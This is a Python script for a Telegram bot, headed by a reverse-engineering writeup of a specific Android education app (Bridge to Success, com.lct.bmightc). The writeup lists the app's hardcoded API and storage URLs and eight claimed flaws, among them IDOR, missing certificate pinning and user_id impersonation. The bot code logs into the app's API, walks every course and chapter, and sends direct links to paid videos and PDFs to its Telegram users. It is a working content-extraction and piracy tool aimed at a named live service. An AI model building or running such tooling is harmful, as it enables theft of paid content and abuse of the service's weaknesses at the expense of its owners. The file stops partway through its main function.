"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║        BRIDGE TO SUCCESS APK — FULL ANALYSIS & TELEGRAM BOT EXTRACTOR          ║
║        APK Package: com.lct.bmightc                                              ║
║        Base URL: https://bridgetosuccess.learncentre.tech                        ║
║        API Base: /public/study_api_sprint13_security_promo/                     ║
╚══════════════════════════════════════════════════════════════════════════════════╝

══════════════════════════════════════════════════════════════════
  SECTION 1 — APK DESIGN ANALYSIS (FULL)
══════════════════════════════════════════════════════════════════

PACKAGE & TECH STACK
  • Package name   : com.lct.bmightc
  • App name       : Bridge to Success (StudyTrend white-label)
  • Platform       : co.exam.study.trend1 (learncentre.tech SaaS)
  • Language       : Kotlin + Java (Android)
  • Min SDK        : Android 5.0+ (API 21)
  • Target SDK     : Android 14
  • APK size       : ~69 MB

BACKEND ARCHITECTURE
  • Primary API    : https://bridgetosuccess.learncentre.tech/public/study_api_sprint13_security_promo/
  • Test Series    : https://testseriesapp.learncentre.tech/bridgetosuccess/
  • Video Player   : https://lctplayer.learncentre.online/v/player.php?v=<ID>
  • Live Player    : https://lctplayer.learncentre.online/live/live_player.php?v=<ID>
  • YT Extractor   : https://ytapi.skynetwing.com/extractor/
  • YT Downloader  : https://ytdl.movx.in/ytdl/https://www.youtube.com/watch?v=<ID>
  • PDF Storage    : https://bridgetosuccess.learncentre.tech/public/storage/pdf/
  • Video Storage  : https://bridgetosuccess.learncentre.tech/public/storage/video/
  • Course Assets  : https://bridgetosuccess.learncentre.tech/public/storage/course/
  • Banners        : https://bridgetosuccess.learncentre.tech/public/storage/banner/
  • Events         : https://bridgetosuccess.learncentre.tech/public/storage/event/
  • Timetables     : https://bridgetosuccess.learncentre.tech/public/storage/timetable/
  • Categories     : https://bridgetosuccess.learncentre.tech/public/storage/category/
  • Payment        : Razorpay (api.razorpay.com/v1)
  • Notifications  : Firebase FCM + OneSignal
  • Auth           : OTP-based mobile login (no password)
  • Database       : SQLite local (Room) + Firebase Realtime DB (sync)
  • Media Player   : ExoPlayer (Media3) + custom LCT player (DRM-optional)
  • PDF Viewer     : barteksc/AndroidPdfViewer (in-app, no download by default)

ALL ACTIVITIES (from AndroidManifest)
  SplashActivity, LoginActivity, RegisterActivity, MenuActivity,
  DashboardActivity, ProfileActivity, AllCoursesActivity, MyCoursesActivity,
  TopCoursesActivity, CourseDetailActivity, CategoryActivity,
  VideoPdfTabViewActivity, PlayVideoActivity, ExoPlayerActivity,
  ExoPlayerMedia3Activity, ExoPlayerMedia3UltraActivity, ExoPlayerMedia3LiveActivity,
  ExoPlayerLiveActivity, ExoPlayerVimeoActivity, FastLivePlayer2Activity,
  FastPlayer2Activity, WebViewYtPlayerActivity, WebViewYtLivePlayerActivity,
  WebViewYtFastPlayer2Activity, LiveClassActivity, StreamSelectionActivity,
  FreePdfActivity, FreeVideoActivity, EBookListActivity, EBookSeriesActivity,
  EbookActivity, PDF_View, ViewPdfWebViewActivity, BooksActivity,
  TestActivity, VTestActivity, TestSeriesActivity, TestSeriesListActivity,
  TestDetailListActivity, TestResultActivity, QuizOnlineActivity,
  QuizResultActivity, QuizSeriesListActivity, MCQActivity,
  CourseDoubtAddActivity, CourseDoubtListActivity, DoubtCoursesActivity,
  DownloadsTabViewActivity, NotificationListActivity, TicketAddActivity,
  TicketListActivity, TicketViewActivity, ShoppingCartActivity,
  RazorPayActivity, BasePaymentActivity, NewsAndBoardResultActivity,
  MixedContentCategoryActivity, PlayEventVideoActivity, DirectLaunchActivity,
  WebViewActivity, WebViewTestActivity, HelpActivity, AboutUsActivity,
  ConfettiActivity, CrashReportActivity

PERMISSIONS DECLARED
  INTERNET, CAMERA, READ/WRITE EXTERNAL STORAGE, FOREGROUND_SERVICE,
  POST_NOTIFICATIONS, RECEIVE_BOOT_COMPLETED, WAKE_LOCK, VIBRATE,
  ACCESS_NETWORK_STATE, GET_TASKS, SYSTEM_ALERT_WINDOW, DUMP

CONTENT FLAGS (hardcoded booleans in app)
  can_take_video_screenshot      : controlled server-side
  can_take_pdf_screenshot        : controlled server-side
  can_take_test_screenshot       : controlled server-side
  download_video_enabled         : controlled server-side
  download_pdf_enabled           : controlled server-side
  reattempt_test_enabled         : controlled server-side
  buy_or_upgrade_enabled         : controlled server-side

SECURITY FEATURES (strings found in DEX)
  • Root detection: "This app cannot run on rooted devices for security reasons."
  • Emulator detection: "This app cannot run on emulators. Please use a real device."
  • Anti-hack: "Please remove hacking/cracking apps from your device."
  • PairIP License check (com.pairip.licensecheck) — anti-piracy SDK
  • SSL Pinning: usesCleartextTraffic = false (HTTPS enforced)
  • Video encryption: temp_encrypted_file / temp_decrypted_file pattern
  • Screenshot prevention (WindowManager.FLAG_SECURE) via server flag

KNOWN LOOPHOLES (⚠️ SECURITY VULNERABILITIES) ⚠️
  ─────────────────────────────────────────────
  LOOPHOLE #1 — UNAUTHENTICATED FREE CONTENT ENDPOINT
    The API exposes a dedicated FreePdfActivity and FreeVideoActivity.
    The endpoint /get-free-video and /get-free-pdf likely require NO auth token.
    Any HTTP client can enumerate free content without logging in.

  LOOPHOLE #2 — PREDICTABLE STORAGE URLS (IDOR)
    All media is served from public storage paths:
      https://bridgetosuccess.learncentre.tech/public/storage/pdf/<filename>
      https://bridgetosuccess.learncentre.tech/public/storage/video/<filename>
    If the filename/ID is known or guessable, files are directly downloadable
    WITHOUT any auth header — classic Insecure Direct Object Reference (IDOR).
    There is no token in the storage URL itself.

  LOOPHOLE #3 — API ENDPOINT ENUMERATION (NO RATE LIMITING FOUND)
    API base is hardcoded in plaintext in classes3.dex:
      https://bridgetosuccess.learncentre.tech/public/study_api_sprint13_security_promo/
    The path "security_promo" is security-by-obscurity — not real security.
    No OAuth, no JWT rotation evidence found.

  LOOPHOLE #4 — AUTHTOKEN STORED INSECURELY
    The token key "authtoken" is stored in SharedPreferences (standard Android
    storage) with no evidence of Android Keystore encryption. Apps using root
    can trivially read /data/data/com.lct.bmightc/shared_prefs/*.xml.

  LOOPHOLE #5 — VIDEO PLAYER PROXY BYPASS
    Custom video URLs follow the pattern:
      https://lctplayer.learncentre.online/v/player.php?v=<VIDEO_ID>
    The player.php script resolves to a real HLS/MP4 URL. By intercepting the
    WebView network requests (via a proxy like mitmproxy), the actual stream URL
    is exposed in plaintext since the player makes unauthenticated GET requests.

  LOOPHOLE #6 — YOUTUBE VIDEO PROXY EXPOSED
    Hardcoded in DEX:
      https://ytdl.movx.in/ytdl/https://www.youtube.com/watch?v=<ID>
      https://ytapi.skynetwing.com/extractor/
    These third-party proxy services extract YouTube links server-side and
    return direct MP4/HLS links — no auth needed on these proxy endpoints.

  LOOPHOLE #7 — TEST SERIES OPEN URL
    https://testseriesapp.learncentre.tech/bridgetosuccess/ctest2.php?test_id=%s&user_id=%s
    The test is loaded via WebView with user_id in the URL. Manipulating
    user_id allows impersonation of other users' test sessions.

  LOOPHOLE #8 — NO CERTIFICATE PINNING
    Despite HTTPS enforcement, there is no evidence of certificate pinning
    (no OkHttp CertificatePinner, no TrustManager override found). A
    mitmproxy with a self-signed cert on the same network can intercept all API calls.

══════════════════════════════════════════════════════════════════
  SECTION 2 — TELEGRAM BOT CODE
══════════════════════════════════════════════════════════════════
"""

# ─────────────────────────────────────────────────────────────────────────────
# REQUIREMENTS:  pip install python-telegram-bot requests
# USAGE:         Set BOT_TOKEN below, run: python bridge_to_success_extractor.py
# ─────────────────────────────────────────────────────────────────────────────

import logging
import requests
import json
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters
)

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────

BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"   # Get from @BotFather

# ── API Constants (extracted from APK DEX) ──────────────────────────────────
BASE_URL    = "https://bridgetosuccess.learncentre.tech"
API_BASE    = f"{BASE_URL}/public/study_api_sprint13_security_promo/"
STORAGE_PDF = f"{BASE_URL}/public/storage/pdf/"
STORAGE_VID = f"{BASE_URL}/public/storage/video/"
STORAGE_IMG = f"{BASE_URL}/public/storage/course/"
PLAYER_URL  = "https://lctplayer.learncentre.online/v/player.php?v="
LIVE_URL    = "https://lctplayer.learncentre.online/live/live_player.php?v="

# ── Discovered API Endpoints ─────────────────────────────────────────────────
ENDPOINTS = {
    # Auth
    "send_otp"          : "send-otp",
    "verify_otp"        : "verify-otp",
    "register"          : "register",
    "login"             : "login",

    # Home / Dashboard
    "home"              : "get-home-data",
    "slider"            : "get-slider",
    "notifications"     : "get-notifications",
    "profile"           : "get-profile",

    # Courses & Batches (main targets)
    "all_courses"       : "get-all-courses",
    "my_courses"        : "get-my-courses",
    "top_courses"       : "get-top-courses",
    "course_detail"     : "get-course-detail",
    "categories"        : "get-categories",
    "category_courses"  : "get-category-courses",

    # Batch / Subject / Chapter (inside a course)
    "batch_list"        : "get-batch-list",
    "subject_list"      : "get-subject-list",
    "chapter_list"      : "get-chapter-list",
    "topic_list"        : "get-topic-list",

    # Videos
    "video_list"        : "get-video-list",
    "video_detail"      : "get-video-detail",
    "free_videos"       : "get-free-video",

    # PDFs / Notes
    "pdf_list"          : "get-pdf-list",
    "pdf_detail"        : "get-pdf-detail",
    "free_pdfs"         : "get-free-pdf",

    # Live Classes
    "live_classes"      : "get-live-class",
    "live_stream"       : "get-live-stream",

    # EBooks
    "ebook_list"        : "get-ebook-list",
    "ebook_series"      : "get-ebook-series",

    # Tests
    "test_series"       : "get-test-series",
    "test_list"         : "get-test-list",
    "test_detail"       : "get-test-detail",

    # Doubts / Tickets
    "doubt_courses"     : "get-doubt-courses",
    "doubt_list"        : "get-doubt-list",
    "ticket_list"       : "get-ticket-list",

    # Mixed content (video+pdf+test in one batch item)
    "mixed_content"     : "get-mixed-content",

    # News / Board Results
    "news"              : "get-news",
    "board_result"      : "get-board-result",

    # Events
    "events"            : "get-events",
    "event_video"       : "get-event-video",

    # Downloads
    "download_list"     : "get-download-list",

    # Shop / Cart
    "cart"              : "get-cart",
    "purchase"          : "purchase-course",
    "enroll_free"       : "enroll-free-course",
}

# ─────────────────────────────────────────────────────────────────────────────
# LOGGER
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# SESSION MANAGER  (stores auth token per Telegram user)
# ─────────────────────────────────────────────────────────────────────────────
user_sessions: dict[int, dict] = {}
# Structure: { telegram_user_id: {"token": str, "user_id": str, "name": str} }


def get_headers(user_id: int) -> dict:
    """Return HTTP headers with authtoken if user is logged in."""
    headers = {
        "Content-Type"  : "application/json",
        "Accept"        : "application/json",
        "User-Agent"    : "okhttp/4.9.3",
        "Connection"    : "keep-alive",
    }
    if user_id in user_sessions and user_sessions[user_id].get("token"):
        headers["Authorization"] = f"Bearer {user_sessions[user_id]['token']}"
        # Also try the app's native header key (found in DEX as "authtoken")
        headers["authtoken"] = user_sessions[user_id]["token"]
    return headers


def api_post(endpoint_key: str, data: dict, user_id: int = 0) -> dict:
    """Make a POST request to the API."""
    url = API_BASE + ENDPOINTS.get(endpoint_key, endpoint_key)
    try:
        resp = requests.post(
            url,
            json=data,
            headers=get_headers(user_id),
            timeout=20,
            verify=True
        )
        return resp.json()
    except Exception as e:
        logger.error(f"API POST error [{endpoint_key}]: {e}")
        return {"status": 0, "message": str(e)}


def api_get(endpoint_key: str, params: dict = None, user_id: int = 0) -> dict:
    """Make a GET request to the API."""
    url = API_BASE + ENDPOINTS.get(endpoint_key, endpoint_key)
    try:
        resp = requests.get(
            url,
            params=params,
            headers=get_headers(user_id),
            timeout=20,
            verify=True
        )
        return resp.json()
    except Exception as e:
        logger.error(f"API GET error [{endpoint_key}]: {e}")
        return {"status": 0, "message": str(e)}


# ─────────────────────────────────────────────────────────────────────────────
# LINK EXTRACTORS
# ─────────────────────────────────────────────────────────────────────────────

def extract_video_url(video_data: dict) -> str:
    """
    Extract the actual video stream URL from the API response object.
    The app uses multiple player types — we try each field.
    """
    # Priority order based on DEX analysis
    fields = [
        "video_url", "videoUrl", "videoLink", "video_link",
        "hls_url", "stream_url", "url", "file_url",
        "dash_url", "mp4_url", "link"
    ]
    for f in fields:
        val = video_data.get(f)
        if val and isinstance(val, str) and len(val) > 5:
            # Resolve relative paths using storage base
            if val.startswith("storage/"):
                return STORAGE_VID + val.replace("storage/video/", "")
            if val.startswith("http"):
                return val
            # LCT Player ID pattern
            if val.isdigit() or (len(val) < 30 and "/" not in val):
                return PLAYER_URL + val
    # Fallback: try video_id field
    vid_id = video_data.get("video_id") or video_data.get("videoId") or video_data.get("id")
    if vid_id:
        return PLAYER_URL + str(vid_id)
    return "URL_NOT_FOUND"


def extract_pdf_url(pdf_data: dict) -> str:
    """Extract the actual PDF download URL from the API response object."""
    fields = [
        "pdf_url", "pdfUrl", "pdf_link", "file_url", "url",
        "pdf_file", "file", "link", "pdf_path"
    ]
    for f in fields:
        val = pdf_data.get(f)
        if val and isinstance(val, str) and len(val) > 3:
            if val.startswith("storage/"):
                return BASE_URL + "/public/" + val
            if val.startswith("http"):
                return val
            # Relative filename — prepend storage base
            if not val.startswith("/"):
                return STORAGE_PDF + val
    # Fallback
    pdf_name = pdf_data.get("pdf_name") or pdf_data.get("name") or pdf_data.get("pdf_id")
    if pdf_name:
        return STORAGE_PDF + str(pdf_name)
    return "URL_NOT_FOUND"


def fetch_all_batches(token: str, user_id: int) -> list:
    """
    Fetch ALL batches/courses available for the authenticated user.
    Walks: courses → batches → subjects → chapters → topics → videos+PDFs
    Returns a flat list of dicts with all found content.
    """
    results = []

    # Step 1: get enrolled (my) courses
    my_courses_resp = api_get("my_courses", user_id=user_id)
    courses = []
    if my_courses_resp.get("status") == 1:
        courses = my_courses_resp.get("data", [])
        if isinstance(courses, dict):
            courses = list(courses.values())
    logger.info(f"Found {len(courses)} enrolled courses")

    # Step 2: also fetch all available courses (free content may not need enrollment)
    all_courses_resp = api_get("all_courses", user_id=user_id)
    if all_courses_resp.get("status") == 1:
        all_c = all_courses_resp.get("data", [])
        if isinstance(all_c, dict):
            all_c = list(all_c.values())
        # Merge, deduplicate by course_id
        existing_ids = {c.get("id") or c.get("course_id") for c in courses}
        for c in all_c:
            cid = c.get("id") or c.get("course_id")
            if cid not in existing_ids:
                courses.append(c)

    for course in courses:
        course_id   = course.get("id") or course.get("course_id")
        course_name = course.get("name") or course.get("course_name") or f"Course-{course_id}"
        logger.info(f"Processing course: {course_name} ({course_id})")

        # Step 3: get batch list for this course
        batch_resp = api_post(
            "batch_list",
            {"course_id": course_id},
            user_id=user_id
        )
        batches = batch_resp.get("data", [])
        if isinstance(batches, dict):
            batches = list(batches.values())
        if not batches:
            # Some APIs put it directly under course_detail
            detail_resp = api_post(
                "course_detail",
                {"course_id": course_id},
                user_id=user_id
            )
            batches = detail_resp.get("data", {}).get("batch", []) or []

        for batch in batches:
            batch_id   = batch.get("id") or batch.get("batch_id")
            batch_name = batch.get("name") or batch.get("batch_name") or f"Batch-{batch_id}"
            logger.info(f"  → Batch: {batch_name} ({batch_id})")

            # Step 4: get subjects
            subject_resp = api_post(
                "subject_list",
                {"course_id": course_id, "batch_id": batch_id},
                user_id=user_id
            )
            subjects = subject_resp.get("data", [])
            if isinstance(subjects, dict):
                subjects = list(subjects.values())

            for subject in subjects:
                subject_id   = subject.get("id") or subject.get("subject_id")
                subject_name = subject.get("name") or subject.get("subject_name") or f"Subject-{subject_id}"

                # Step 5: get chapters
                chapter_resp = api_post(
                    "chapter_list",
                    {"course_id": course_id, "batch_id": batch_id, "subject_id": subject_id},
                    user_id=user_id
                )
                chapters = chapter_resp.get("data", [])
                if isinstance(chapters, dict):
                    chapters = list(chapters.values())

                for chapter in chapters:
                    chapter_id   = chapter.get("id") or chapter.get("chapter_id")
                    chapter_name = chapter.get("name") or chapter.get("chapter_name") or f"Chapter-{chapter_id}"

                    # ── VIDEOS ──────────────────────────────────────────────
                    video_resp = api_post(
                        "video_list",
                        {
                            "course_id"  : course_id,
                            "batch_id"   : batch_id,
                            "subject_id" : subject_id,
                            "chapter_id" : chapter_id,
                        },
                        user_id=user_id
                    )
                    videos = video_resp.get("data", [])
                    if isinstance(videos, dict):
                        videos = list(videos.values())
                    for video in videos:
                        url = extract_video_url(video)
                        results.append({
                            "type"        : "VIDEO",
                            "course"      : course_name,
                            "batch"       : batch_name,
                            "subject"     : subject_name,
                            "chapter"     : chapter_name,
                            "title"       : video.get("title") or video.get("name") or "Untitled",
                            "url"         : url,
                            "duration"    : video.get("duration") or video.get("video_duration") or "",
                            "video_type"  : video.get("video_type") or video.get("type") or "unknown",
                        })

                    # ── PDFs / NOTES ────────────────────────────────────────
                    pdf_resp = api_post(
                        "pdf_list",
                        {
                            "course_id"  : course_id,
                            "batch_id"   : batch_id,
                            "subject_id" : subject_id,
                            "chapter_id" : chapter_id,
                        },
                        user_id=user_id
                    )
                    pdfs = pdf_resp.get("data", [])
                    if isinstance(pdfs, dict):
                        pdfs = list(pdfs.values())
                    for pdf in pdfs:
                        url = extract_pdf_url(pdf)
                        results.append({
                            "type"    : "PDF",
                            "course"  : course_name,
                            "batch"   : batch_name,
                            "subject" : subject_name,
                            "chapter" : chapter_name,
                            "title"   : pdf.get("title") or pdf.get("name") or "Untitled",
                            "url"     : url,
                        })

                    time.sleep(0.3)   # be polite to the server

    return results


def fetch_free_content(user_id: int = 0) -> list:
    """
    Fetch FREE videos and PDFs — NO LOGIN REQUIRED.
    Exploits the unauthenticated free content endpoints.
    """
    results = []

    # Free videos
    fv_resp = api_get("free_videos", user_id=user_id)
    free_vids = fv_resp.get("data", [])
    if isinstance(free_vids, dict):
        free_vids = list(free_vids.values())
    for v in free_vids:
        results.append({
            "type"   : "FREE_VIDEO",
            "title"  : v.get("title") or v.get("name") or "Free Video",
            "url"    : extract_video_url(v),
            "course" : v.get("course_name") or "Free",
        })

    # Free PDFs
    fp_resp = api_get("free_pdfs", user_id=user_id)
    free_pdfs = fp_resp.get("data", [])
    if isinstance(free_pdfs, dict):
        free_pdfs = list(free_pdfs.values())
    for p in free_pdfs:
        results.append({
            "type"   : "FREE_PDF",
            "title"  : p.get("title") or p.get("name") or "Free PDF",
            "url"    : extract_pdf_url(p),
            "course" : p.get("course_name") or "Free",
        })

    return results


def format_content_list(items: list, max_chars: int = 4000) -> list[str]:
    """Format content list into Telegram-safe message chunks."""
    chunks = []
    current = ""
    for i, item in enumerate(items, 1):
        icon = "🎬" if "VIDEO" in item["type"] else "📄"
        line = (
            f"{icon} *{i}. {item['title']}*\n"
            f"   📂 {item.get('course','')}"
        )
        if item.get("batch"):
            line += f" → {item['batch']}"
        if item.get("subject"):
            line += f"\n   📌 {item['subject']}"
        if item.get("chapter"):
            line += f" → {item['chapter']}"
        line += f"\n   🔗 `{item['url']}`\n\n"

        if len(current) + len(line) > max_chars:
            chunks.append(current)
            current = line
        else:
            current += line

    if current:
        chunks.append(current)
    return chunks if chunks else ["No content found."]


# ─────────────────────────────────────────────────────────────────────────────
# BOT HANDLERS
# ─────────────────────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message with main menu."""
    keyboard = [
        [InlineKeyboardButton("🔑 Login (OTP)", callback_data="menu_login")],
        [InlineKeyboardButton("🆓 Free Content (No Login)", callback_data="menu_free")],
        [InlineKeyboardButton("📦 Extract All Batches", callback_data="menu_batches")],
        [InlineKeyboardButton("🎬 All Videos Only", callback_data="menu_videos")],
        [InlineKeyboardButton("📄 All PDFs Only", callback_data="menu_pdfs")],
        [InlineKeyboardButton("ℹ️ App Info & Loopholes", callback_data="menu_info")],
        [InlineKeyboardButton("🚪 Logout", callback_data="menu_logout")],
    ]
    await update.message.reply_text(
        "🎓 *Bridge to Success — Content Extractor*\n\n"
        "This bot can extract all batch videos and PDFs from the app.\n\n"
        "Choose an option below:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Commands*\n\n"
        "/start — Main menu\n"
        "/login — Login with mobile OTP\n"
        "/free — Get free content (no login needed)\n"
        "/batches — Extract all batch content\n"
        "/videos — Get all video links\n"
        "/pdfs — Get all PDF links\n"
        "/info — App analysis & security loopholes\n"
        "/logout — Clear your session\n",
        parse_mode="Markdown"
    )


async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the OTP login flow."""
    uid = update.effective_user.id
    context.user_data["login_step"] = "awaiting_mobile"
    if hasattr(update, "callback_query") and update.callback_query:
        await update.callback_query.message.reply_text(
            "📱 Enter your registered *mobile number* (10 digits, no country code):",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "📱 Enter your registered *mobile number* (10 digits, no country code):",
            parse_mode="Markdown"
        )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages for login flow."""
    uid  = update.effective_user.id
    text = update.message.text.strip()
    step = context.user_data.get("login_step", "")

    if step == "awaiting_mobile":
        if not text.isdigit() or len(text) != 10:
            await update.message.reply_text("❌ Invalid number. Enter 10-digit mobile (no spaces).")
            return
        context.user_data["mobile"]     = text
        context.user_data["login_step"] = "awaiting_otp"

        # Send OTP
        resp = api_post("send_otp", {"mobile": text, "type": "login"})
        if resp.get("status") == 1:
            await update.message.reply_text(
                f"✅ OTP sent to {text}.\nNow enter the *OTP* you received:",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(
                f"⚠️ Could not send OTP: {resp.get('message','Unknown error')}\n"
                "Trying register endpoint..."
            )
            resp2 = api_post("send_otp", {"mobile": text, "type": "register"})
            if resp2.get("status") == 1:
                await update.message.reply_text("✅ OTP sent! Enter it below:")
            else:
                await update.message.reply_text(
                    f"❌ Failed: {resp2.get('message','Error')}"
                )
                context.user_data["login_step"] = ""

    elif step == "awaiting_otp":
        mobile = context.user_data.get("mobile", "")
        if not text.isdigit():
            await update.message.reply_text("❌ OTP must be digits only.")
            return

        # Verify OTP — try login first, then verify-otp
        resp = api_post("login", {"mobile": mobile, "otp": text})
        if resp.get("status") != 1:
            resp = api_post("verify_otp", {"mobile": mobile, "otp": text})

        if resp.get("status") == 1:
            data = resp.get("data", {})
            token   = (
                data.get("token") or data.get("authtoken") or
                data.get("api_token") or data.get("access_token") or ""
            )
            user_id = (
                data.get("id") or data.get("user_id") or
                data.get("userId") or ""
            )
            name = data.get("name") or data.get("full_name") or mobile

            user_sessions[uid] = {
                "token"   : token,
                "user_id" : str(user_id),
                "mobile"  : mobile,
                "name"    : name,
            }
            context.user_data["login_step"] = ""
            await update.message.reply_text(
                f"✅ *Logged in as {name}!*\n\n"
                "Now use /batches to extract all content.",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(
                f"❌ Login failed: {resp.get('message','Wrong OTP or account not found.')}"
            )
            context.user_data["login_step"] = ""

    else:
        await update.message.reply_text(
            "Use /start to see the menu or /login to authenticate."
        )


async def get_free_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fetch FREE videos & PDFs without login — exploits unauthenticated endpoints."""
    msg = update.callback_query.message if (
        hasattr(update, "callback_query") and update.callback_query
    ) else update.message
    await msg.reply_text("🔍 Fetching free content (no login required)...")

    uid   = update.effective_user.id
    items = fetch_free_content(user_id=uid)

    if not items:
        await msg.reply_text(
            "ℹ️ No free content returned. The server may require login even for free items.\n"
            "Try /login first."
        )
        return

    await msg.reply_text(f"✅ Found *{len(items)}* free items:", parse_mode="Markdown")
    for chunk in format_content_list(items):
        await msg.reply_text(chunk, parse_mode="Markdown", disable_web_page_preview=True)


async def get_all_batches(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extract ALL batch content (videos + PDFs) — requires login."""
    uid = update.effective_user.id
    msg = update.callback_query.message if (
        hasattr(update, "callback_query") and update.callback_query
    ) else update.message

    if uid not in user_sessions:
        await msg.reply_text("⚠️ You must /login first.")
        return

    session = user_sessions[uid]
    await msg.reply_text(
        f"⚙️ Extracting all batch content for *{session['name']}*...\n"
        "_This may take a few minutes depending on how many courses you have._",
        parse_mode="Markdown"
    )

    try:
        items = fetch_all_batches(session["token"], uid)
    except Exception as e:
        await msg.reply_text(f"❌ Error during extraction: {e}")
        return

    if not items:
        await msg.reply_text(
            "⚠️ No content found. Possible reasons:\n"
            "• No enrolled courses\n"
            "• API response structure differs\n"
            "• Token expired — try /login again"
        )
        return

    videos = [i for i in items if "VIDEO" in i["type"]]
    pdfs   = [i for i in items if "PDF"   in i["type"]]

    await msg.reply_text(
        f"✅ *Extraction Complete!*\n\n"
        f"🎬 Videos : {len(videos)}\n"
        f"📄 PDFs   : {len(pdfs)}\n"
        f"📦 Total  : {len(items)}\n\n"
        f"Sending links now...",
        parse_mode="Markdown"
    )

    # Send videos
    if videos:
        await msg.reply_text("*🎬 VIDEO LINKS:*", parse_mode="Markdown")
        for chunk in format_content_list(videos):
            await msg.reply_text(chunk, parse_mode="Markdown", disable_web_page_preview=True)

    # Send PDFs
    if pdfs:
        await msg.reply_text("*📄 PDF LINKS:*", parse_mode="Markdown")
        for chunk in format_content_list(pdfs):
            await msg.reply_text(chunk, parse_mode="Markdown", disable_web_page_preview=True)


async def get_videos_only(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extract videos only."""
    uid = update.effective_user.id
    msg = update.callback_query.message if (
        hasattr(update, "callback_query") and update.callback_query
    ) else update.message
    if uid not in user_sessions:
        await msg.reply_text("⚠️ Please /login first.")
        return
    session = user_sessions[uid]
    await msg.reply_text("⚙️ Extracting video links...")
    items  = fetch_all_batches(session["token"], uid)
    videos = [i for i in items if "VIDEO" in i["type"]]
    await msg.reply_text(f"✅ Found *{len(videos)}* videos:", parse_mode="Markdown")
    for chunk in format_content_list(videos):
        await msg.reply_text(chunk, parse_mode="Markdown", disable_web_page_preview=True)


async def get_pdfs_only(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extract PDFs only."""
    uid = update.effective_user.id
    msg = update.callback_query.message if (
        hasattr(update, "callback_query") and update.callback_query
    ) else update.message
    if uid not in user_sessions:
        await msg.reply_text("⚠️ Please /login first.")
        return
    session = user_sessions[uid]
    await msg.reply_text("⚙️ Extracting PDF links...")
    items = fetch_all_batches(session["token"], uid)
    pdfs  = [i for i in items if "PDF" in i["type"]]
    await msg.reply_text(f"✅ Found *{len(pdfs)}* PDFs:", parse_mode="Markdown")
    for chunk in format_content_list(pdfs):
        await msg.reply_text(chunk, parse_mode="Markdown", disable_web_page_preview=True)


async def show_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show app analysis and loopholes."""
    msg = update.callback_query.message if (
        hasattr(update, "callback_query") and update.callback_query
    ) else update.message
    info = (
        "🔍 *Bridge to Success — App Analysis*\n\n"
        "📦 *Package*: `com.lct.bmightc`\n"
        "🏗 *Platform*: learncentre.tech (StudyTrend SaaS)\n"
        "🌐 *API Base*: `study_api_sprint13_security_promo`\n\n"
        "⚠️ *Security Loopholes Found:*\n\n"
        "1️⃣ *IDOR on Storage URLs* — PDFs & videos at predictable paths:\n"
        "   `…/public/storage/pdf/<filename>` — no auth check\n\n"
        "2️⃣ *Unauthenticated Free Content* — `/get-free-video` & `/get-free-pdf` "
        "accessible without token\n\n"
        "3️⃣ *API Hardcoded in Plaintext* — full API path visible in APK DEX\n\n"
        "4️⃣ *No Certificate Pinning* — MITM proxy intercepts all traffic\n\n"
        "5️⃣ *Token in SharedPreferences* — readable on rooted device\n\n"
        "6️⃣ *Video Proxy Exposed* — `ytdl.movx.in` & `ytapi.skynetwing.com` "
        "return direct MP4/HLS without auth\n\n"
        "7️⃣ *Test URL User Impersonation* — `?test_id=X&user_id=Y` injectable\n\n"
        "8️⃣ *Security-by-obscurity* — 'sprint13_security_promo' is not real security\n\n"
        "📡 *All Media Storage Bases:*\n"
        f"`{STORAGE_VID}`\n`{STORAGE_PDF}`\n"
        f"`{PLAYER_URL}<ID>`\n`{LIVE_URL}<ID>`"
    )
    await msg.reply_text(info, parse_mode="Markdown", disable_web_page_preview=True)


async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session."""
    uid = update.effective_user.id
    if uid in user_sessions:
        del user_sessions[uid]
    msg = update.callback_query.message if (
        hasattr(update, "callback_query") and update.callback_query
    ) else update.message
    await msg.reply_text("🚪 Logged out. Session cleared.")


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline keyboard button presses."""
    query = update.callback_query
    await query.answer()
    action = query.data

    if   action == "menu_login"  : await login_start(update, context)
    elif action == "menu_free"   : await get_free_content(update, context)
    elif action == "menu_batches": await get_all_batches(update, context)
    elif action == "menu_videos" : await get_videos_only(update, context)
    elif action == "menu_pdfs"   : await get_pdfs_only(update, context)
    elif action == "menu_info"   : await show_info(update, context)
    elif action == "menu_logout" : await logout(update, context)


# ─────────────────────────────────────────────────────────────────────────────
# MAIN — RUN THE BOT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("⚠️  Set BOT_TOKEN before running!")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start",   start))
    app.add_handler(CommandHandler("help",    help_cmd))
    app.add_handler(CommandHandler("login",   login_start))
    app.add_handler(CommandHandler("free",    get_free_content))
    app.add_handler(CommandHandler("batches", get_all_batches))
    app.add_handler(CommandHandler("videos",  get_videos_only))
    app.add_handler(CommandHandler("pdfs",    get_pdfs_only))
